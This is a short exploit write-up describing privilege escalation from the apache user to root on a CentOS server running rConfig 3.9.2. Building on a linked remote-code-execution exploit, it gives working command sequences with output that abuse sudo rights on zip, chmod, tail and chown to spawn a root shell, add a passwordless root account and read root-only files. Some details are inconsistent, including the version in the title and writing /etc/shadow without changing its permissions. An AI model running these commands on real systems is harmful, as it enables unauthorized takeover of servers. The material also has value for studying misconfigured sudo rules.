# rConfig 3.2.

Discovered my dmw0ng & TheCyberGeek.
Discord: dmw0ng#4449
Email: 
Discord: TheCyberGeek#1892
Email: cybergeek19@protonmail.com

Multiple attack vectors from Apache user to system compromise.

OS: CentOS 7.7.1908
Software: rConfig v3.9.2

Using Askar's exploit:<br>
https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/ we gain apache user on rConfig 3.9.2.

# Rooting Multiple Vectors:

User apache may run the following commands on Misconfigured:<br>
    (ALL) NOPASSWD: /usr/bin/crontab, /usr/bin/zip, /bin/chmod, /bin/chown, /usr/bin/whoami, /usr/bin/wc, /usr/bin/tail, /bin/rm
    
Using crontabs was useless since we haev no-login.

# sudo /usr/bin/zip:

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 65%)
sudo rm $TF
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
hostname
rConfig-TCLRed
```

# sudo /bin/chmod
```
sudo /bin/chmod 777 /etc/passwd
sudo /bin/chmod 777 /etc/passwd
echo "pwned:::0:99999:7:::" >> /etc/shadow
echo "pwned:x:0:0:root:/root:/bin/bash" >> /etc/passwd
su pwned
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
hostname
rConfig-TCLRed
```

# sudo /usr/bin/tail File Read
```
id
uid=48(apache) gid=48(apache) groups=48(apache)
ls -la /root/root.txt
-rwx------ 1 root root 19 Nov 25 11:41 /root/root.txt
cat /root/root.txt

LFILE=/root/root.txt
sudo tail -c1G "$LFILE"
I got root
```

# sudo /bin/chown Change File Permissions
```
ls -la /root/root.txt
-rwx------ 1 root root 19 Nov 25 11:41 /root/root.txt
sudo /bin/chown apache:apache /root/root.txt
ls -la /root/root.txt
-rwx------ 1 apache apache 19 Nov 25 11:41 /root/root.txt
cat /root/root.txt
I got root
```
